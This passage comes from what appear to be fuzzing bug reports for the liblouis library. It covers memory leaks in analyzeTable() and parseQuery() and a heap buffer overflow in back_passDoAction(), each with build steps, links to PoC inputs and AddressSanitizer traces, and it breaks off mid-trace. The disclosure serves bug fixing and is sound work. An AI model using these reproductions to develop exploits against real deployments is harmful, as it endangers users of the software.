Indirect leak of 21 byte(s) in 4 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828f2b in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:203:16
    #2 0x563630823d7e in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:828:13
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 14 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828ec3 in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:202:10
    #2 0x56363082421d in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:868:8
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 9 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828ec3 in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:202:10
    #2 0x563630823b68 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:810:14
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 7 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828ec3 in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:202:10
    #2 0x5636308240a9 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:853:8
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 5 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630828f2b in feat_new /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:203:16
    #2 0x56363082421d in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:868:8
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 3 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630829165 in list_dup /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:121:24
    #2 0x56363082408b in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:853:27
    #3 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #4 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #5 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #6 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

Indirect leak of 3 byte(s) in 1 object(s) allocated from:
    #0 0x56363078daee in strdup (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x100aee) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #1 0x563630824601 in list_conj /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:62:22
    #2 0x563630828c38 in parseLanguageTag /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:284:11
    #3 0x563630823838 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:770:21
    #4 0x5636308220f9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/liblouis/metadata.c:898:20
    #5 0x5636307e44ef in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/liblouis/./driver-API-3d95765-lou_indexTables-leak.c:20:2
    #6 0x5636306f1cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x64cb4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #7 0x5636306dade6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x4dde6) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #8 0x5636306e089a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x5389a) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #9 0x56363070b056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x7e056) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)
    #10 0x7f776ea2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f776ea2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5636306d59b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/liblouis/driver-API-3d95765-lou_indexTables-leak+0x489b4) (BuildId: 419145a04361a7140ab08798554acc4b893ede67)

SUMMARY: AddressSanitizer: 683 byte(s) leaked in 31 allocation(s).

INFO: a leak has been found in the initial corpus.

INFO: to ignore leaks on libFuzzer side use -detect_leaks=0.
```

# poc-API-3d95765-analyzeTable-leak
Memory leak in `analyzeTable()` caused by `goto`

## Summary
In `analyzeTable()`, if liblouis fall into `compile_error`, the memory buffer `k` is not free-ed.

https://github.com/liblouis/liblouis/blob/42af0893e7ac47761ac5ed33c04e43f541f67c46/liblouis/metadata.c#L721

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code could be downloaded [here](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-3d95765-analyzeTable-leak.c).
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-analyzeTable-leak.c -o ./driver-API-3d95765-analyzeTable-leak -fsanitize=fuzzer,address,undefined -I./liblouis ./liblouis/.libs/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-analyzeTable-leak) and run the compiled driver: `$ ./driver-API-3d95765-analyzeTable-leak ./poc-API-3d95765-analyzeTable-leak`

## ASan Report
```
$ ./driver-API-3d95765-analyzeTable-leak poc-API-3d95765-analyzeTable-leak 
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1960198522
INFO: Loaded 1 modules   (2589 inline 8-bit counters): 2589 [0x55e5ebdf2f48, 0x55e5ebdf3965), 
INFO: Loaded 1 PC tables (2589 PCs): 2589 [0x55e5ebdf3968,0x55e5ebdfdb38), 
./driver-API-3d95765-analyzeTable-leak: Running 1 inputs 1 time(s) each.
Running: poc-API-3d95765-analyzeTable-leak
Unexpected character '�' on line 1, column 101
No tables were indexed
Unexpected character '�' on line 1, column 101
No tables were indexed

=================================================================
==751398==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 99 byte(s) in 1 object(s) allocated from:
    #0 0x55e5ebd0bde3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x118de3) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)
    #1 0x55e5ebd8e27b in widestrToStr /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:651:17
    #2 0x55e5ebd88db7 in analyzeTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:721:17
    #3 0x55e5ebd881c9 in lou_indexTables /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:901:20
    #4 0x55e5ebd4a5bf in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak.c:22:2
    #5 0x55e5ebc57cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x64cb4) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)
    #6 0x55e5ebc40de6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x4dde6) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)
    #7 0x55e5ebc4689a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x5389a) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)
    #8 0x55e5ebc71056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x7e056) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)
    #9 0x7f8a8c42a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #10 0x7f8a8c42a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #11 0x55e5ebc3b9b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-analyzeTable-leak+0x489b4) (BuildId: 98215438c2c3a7706c26e5bfffbb37dc265b40c6)

SUMMARY: AddressSanitizer: 99 byte(s) leaked in 1 allocation(s).

INFO: a leak has been found in the initial corpus.

INFO: to ignore leaks on libFuzzer side use -detect_leaks=0.
```

# poc-API-3d95765-parseQuery-leak
Memory leak in `parseQuery()` caused by `goto`

## Summary
In `parseQuery()`, if liblouis fall into `compile_error`, the memory buffer `k` is not free-ed.

https://github.com/liblouis/liblouis/blob/798304bfb1a05ff88465297d6df03bd7d7ed0d9f/liblouis/metadata.c#L531

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
2. Compile the fuzz driver, the fuzz driver code could be downloaded [here](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/driver-API-3d95765-parseQuery-leak.c).
    The compile command is:
    ```bash
    $ clang ./driver-API-3d95765-parseQuery-leak.c -o ./driver-API-3d95765-parseQuery-leak -fsanitize=fuzzer,address,undefined -I./liblouis ./liblouis/.libs/liblouis.a -lyaml -g
    ```
3. Download the [poc file](https://raw.githubusercontent.com/Marsman1996/pocs/master/liblouis/poc-API-3d95765-parseQuery-leak) and run the compiled driver: `$ ./driver-API-3d95765-parseQuery-leak ./poc-API-3d95765-parseQuery-leak`

## ASAN Report
```
$ ./driver-API-3d95765-parseQuery-leak poc-API-3d95765-parseQuery-leak 
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 576973481
INFO: Loaded 1 modules   (2597 inline 8-bit counters): 2597 [0x55d0e4e2ef68, 0x55d0e4e2f98d), 
INFO: Loaded 1 PC tables (2597 PCs): 2597 [0x55d0e4e2f990,0x55d0e4e39be0), 
./driver-API-3d95765-parseQuery-leak: Running 1 inputs 1 time(s) each.
Running: poc-API-3d95765-parseQuery-leak
warning: lou_setDataPath is deprecated.
Tables have not been indexed yet. Indexing LOUIS_TABLEPATH.
./dummy_file/liblouis/tables is not a directory
Not a valid language tag: ppppppppppppp
No table could be found for query 'r:ppppppppppppp
u:U'
warning: lou_setDataPath is deprecated.
Not a valid language tag: ppppppppppppp
No table could be found for query 'r:ppppppppppppp
u:U'

=================================================================
==1671673==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 14 byte(s) in 1 object(s) allocated from:
    #0 0x55d0e4d47de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x118de3) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #1 0x55d0e4dc75d5 in parseQuery /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:531:10
    #2 0x55d0e4dc707b in lou_findTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:1004:24
    #3 0x55d0e4d8665a in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak.c:25:19
    #4 0x55d0e4c93cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x64cb4) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #5 0x55d0e4c7cde6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x4dde6) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #6 0x55d0e4c8289a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x5389a) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #7 0x55d0e4cad056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x7e056) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #8 0x7f13a662a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f13a662a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x55d0e4c779b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x489b4) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)

Direct leak of 2 byte(s) in 1 object(s) allocated from:
    #0 0x55d0e4d47de3 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x118de3) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #1 0x55d0e4dc764d in parseQuery /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:535:15
    #2 0x55d0e4dc707b in lou_findTable /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/metadata.c:1004:24
    #3 0x55d0e4d8665a in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak.c:25:19
    #4 0x55d0e4c93cb4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x64cb4) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #5 0x55d0e4c7cde6 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x4dde6) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #6 0x55d0e4c8289a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x5389a) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #7 0x55d0e4cad056 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x7e056) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)
    #8 0x7f13a662a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #9 0x7f13a662a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #10 0x55d0e4c779b4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/driver-API-3d95765-parseQuery-leak+0x489b4) (BuildId: 89691af59c97c93b3d5647ac844190735a17cafd)

SUMMARY: AddressSanitizer: 16 byte(s) leaked in 2 allocation(s).

INFO: a leak has been found in the initial corpus.

INFO: to ignore leaks on libFuzzer side use -detect_leaks=0.
```

# poc-API-3d95765-back_passDoAction-HBO
Heap buffer overflow in `back_passDoAction()`

## Reference
https://github.com/liblouis/liblouis/issues/1719

## Summary
There is a heap buffer overflow problem in `back_passDoAction()` at liblouis/lou_backTranslateString.c:1542 when run `fuzz_backtranslate`

https://github.com/liblouis/liblouis/blob/798304bfb1a05ff88465297d6df03bd7d7ed0d9f/liblouis/lou_backTranslateString.c#L1541-L1542

In `back_passDoTest()`, `match->startReplace` is assigned `-1`. So in `back_passDoAction()` the `k` is `-1`, which causes a heap buffer overflow.

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
    ```bash
    $ ./autogen.sh
    $ mkdir build_asan
    $ CC="clang -fsanitize=address,fuzzer-no-link -g " ../configure --prefix=$(pwd)/../bin_asan
    $ make -j && make install
    ```
2. Compile the fuzz driver, the fuzz driver code is in `tests/fuzzing/fuzz_backtranslate.c`.
    The compile command is:
    ```bash
    $ clang ./fuzz_backtranslate.c -o ./fuzz_backtranslate -fsanitize=fuzzer,address,undefined -g -I ./build_asan/liblouis -I ../liblouis ./bin_asan/lib/liblouis.a -lyaml
    ```
3. Download the [poc file](https://github.com/Marsman1996/pocs/raw/refs/heads/master/liblouis/poc-API-3d95765-back_passDoAction-HBO) and run the compiled driver: `$ ./fuzz_backtranslate ./poc-API-3d95765-back_passDoAction-HBO`

## ASAN Report
```
$ ./fuzz_backtranslate ./poc-API-3d95765-back_passDoAction-HBO 
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3645357754
INFO: Loaded 1 modules   (2923 inline 8-bit counters): 2923 [0x5607fcb39748, 0x5607fcb3a2b3), 
INFO: Loaded 1 PC tables (2923 PCs): 2923 [0x5607fcb3a2b8,0x5607fcb45968), 
./fuzz_backtranslate: Running 1 inputs 1 time(s) each.
Running: ./poc-API-3d95765-back_passDoAction-HBO
=================================================================
==1093132==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5210000050fc at pc 0x5607fcaca58e bp 0x7ffedf830350 sp 0x7ffedf830348
WRITE of size 4 at 0x5210000050fc thread T0
    #0 0x5607fcaca58d in back_passDoAction build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:1542:17
    #1 0x5607fcac5525 in makeCorrections build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:1066:9
    #2 0x5607fcabf247 in _lou_backTranslate build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:261:9
